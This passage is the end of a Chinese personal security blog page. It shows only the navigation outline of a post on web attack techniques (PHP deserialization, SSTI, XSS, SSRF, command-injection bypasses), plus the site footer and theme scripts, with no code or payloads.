class="nav-number">9.1.</span> <span class="nav-text">shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过open-basedir"><span class="nav-number">9.2.</span> <span class="nav-text">绕过open_basedir</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过preg-match"><span class="nav-number">9.3.</span> <span class="nav-text">绕过preg_match</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无参数命令执行"><span class="nav-number">9.4.</span> <span class="nav-text">无参数命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#奇技淫巧"><span class="nav-number">9.5.</span> <span class="nav-text">奇技淫巧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#assert命令注入"><span class="nav-number">9.5.1.</span> <span class="nav-text">assert命令注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查找未被过滤的函数"><span class="nav-number">9.5.2.</span> <span class="nav-text">查找未被过滤的函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1以下通杀绕过disable-function"><span class="nav-number">9.6.</span> <span class="nav-text">7.1以下通杀绕过disable_function</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php反序列化"><span class="nav-number">10.</span> <span class="nav-text">php反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#魔法函数"><span class="nav-number">10.1.</span> <span class="nav-text">魔法函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar反序列化"><span class="nav-number">10.2.</span> <span class="nav-text">phar反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE-2-phar"><span class="nav-number">10.3.</span> <span class="nav-text">XXE 2 phar</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#原生类反序列化"><span class="nav-number">10.4.</span> <span class="nav-text">原生类反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#session反序列化"><span class="nav-number">10.5.</span> <span class="nav-text">session反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#soap反序列化"><span class="nav-number">10.6.</span> <span class="nav-text">soap反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mysql-触发phar反序列化"><span class="nav-number">10.7.</span> <span class="nav-text">Mysql 触发phar反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSTI"><span class="nav-number">11.</span> <span class="nav-text">SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Jinja2中的沙箱逃逸"><span class="nav-number">11.1.</span> <span class="nav-text">Jinja2中的沙箱逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#读文件"><span class="nav-number">11.1.1.</span> <span class="nav-text">读文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写文件"><span class="nav-number">11.1.2.</span> <span class="nav-text">写文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#命令执行"><span class="nav-number">11.1.3.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反弹shell-1"><span class="nav-number">11.1.4.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#加载自定义模块"><span class="nav-number">11.1.5.</span> <span class="nav-text">加载自定义模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#python3"><span class="nav-number">11.1.6.</span> <span class="nav-text">python3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bypass-1"><span class="nav-number">11.1.7.</span> <span class="nav-text">bypass</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flask继承链读取配置文件"><span class="nav-number">11.2.</span> <span class="nav-text">flask继承链读取配置文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flask-session-伪造"><span class="nav-number">11.3.</span> <span class="nav-text">flask session 伪造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#django-sessionid伪造（客户端存储认证信息"><span class="nav-number">11.4.</span> <span class="nav-text">django sessionid伪造（客户端存储认证信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-number">12.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">12.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分类"><span class="nav-number">12.2.</span> <span class="nav-text">分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见exp"><span class="nav-number">12.3.</span> <span class="nav-text">常见exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过安全策略"><span class="nav-number">12.4.</span> <span class="nav-text">绕过安全策略</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#编码绕过"><span class="nav-number">12.4.1.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bypass-http-only"><span class="nav-number">12.4.2.</span> <span class="nav-text">bypass http-only</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bypass-CSP"><span class="nav-number">12.4.3.</span> <span class="nav-text">bypass CSP</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#location-href"><span class="nav-number">12.4.3.1.</span> <span class="nav-text">location.href</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#iframe"><span class="nav-number">12.4.3.2.</span> <span class="nav-text">iframe</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#用CDN来绕过"><span class="nav-number">12.4.3.3.</span> <span class="nav-text">用CDN来绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#站点可控静态资源绕过"><span class="nav-number">12.4.3.4.</span> <span class="nav-text">站点可控静态资源绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#站点可控JSONP绕过"><span class="nav-number">12.4.3.5.</span> <span class="nav-text">站点可控JSONP绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#base-uri绕过"><span class="nav-number">12.4.3.6.</span> <span class="nav-text">base-uri绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#不完整script标签绕过nonce"><span class="nav-number">12.4.3.7.</span> <span class="nav-text">不完整script标签绕过nonce</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PDF-XSS"><span class="nav-number">12.4.3.8.</span> <span class="nav-text">PDF-XSS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#svg-绕过"><span class="nav-number">12.4.3.9.</span> <span class="nav-text">svg 绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#不完整的资源标签获取资源"><span class="nav-number">12.4.3.10.</span> <span class="nav-text">不完整的资源标签获取资源</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CSS选择器获取内容"><span class="nav-number">12.4.3.11.</span> <span class="nav-text">CSS选择器获取内容</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CRLF绕过"><span class="nav-number">12.4.3.12.</span> <span class="nav-text">CRLF绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御"><span class="nav-number">12.5.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF"><span class="nav-number">13.</span> <span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF"><span class="nav-number">14.</span> <span class="nav-text">SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击方法"><span class="nav-number">14.1.</span> <span class="nav-text">攻击方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#利用-Gopher-打redis"><span class="nav-number">14.1.1.</span> <span class="nav-text">利用 Gopher 打redis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用-Gopher-打fast-cgi"><span class="nav-number">14.1.2.</span> <span class="nav-text">利用 Gopher 打fast-cgi</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dnslog-解决无回显"><span class="nav-number">14.1.3.</span> <span class="nav-text">dnslog 解决无回显</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#布尔型ssrf"><span class="nav-number">14.1.4.</span> <span class="nav-text">布尔型ssrf</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过方法"><span class="nav-number">14.2.</span> <span class="nav-text">绕过方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御方法-1"><span class="nav-number">14.3.</span> <span class="nav-text">防御方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行-1"><span class="nav-number">15.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#空格过滤"><span class="nav-number">15.1.</span> <span class="nav-text">空格过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令分割符"><span class="nav-number">15.2.</span> <span class="nav-text">命令分割符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#花括号"><span class="nav-number">15.3.</span> <span class="nav-text">花括号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#黑名单绕过"><span class="nav-number">15.4.</span> <span class="nav-text">黑名单绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#拼接绕过"><span class="nav-number">15.4.1.</span> <span class="nav-text">拼接绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#编码绕过-1"><span class="nav-number">15.4.2.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#单引号或双引号绕过"><span class="nav-number">15.4.3.</span> <span class="nav-text">单引号或双引号绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反斜杠绕过"><span class="nav-number">15.4.4.</span> <span class="nav-text">反斜杠绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#shell特殊变量绕过"><span class="nav-number">15.4.5.</span> <span class="nav-text">shell特殊变量绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#长度限制"><span class="nav-number">15.4.6.</span> <span class="nav-text">长度限制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内联执行"><span class="nav-number">15.4.7.</span> <span class="nav-text">内联执行</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查看文件"><span class="nav-number">15.5.</span> <span class="nav-text">查看文件</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Moyu</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
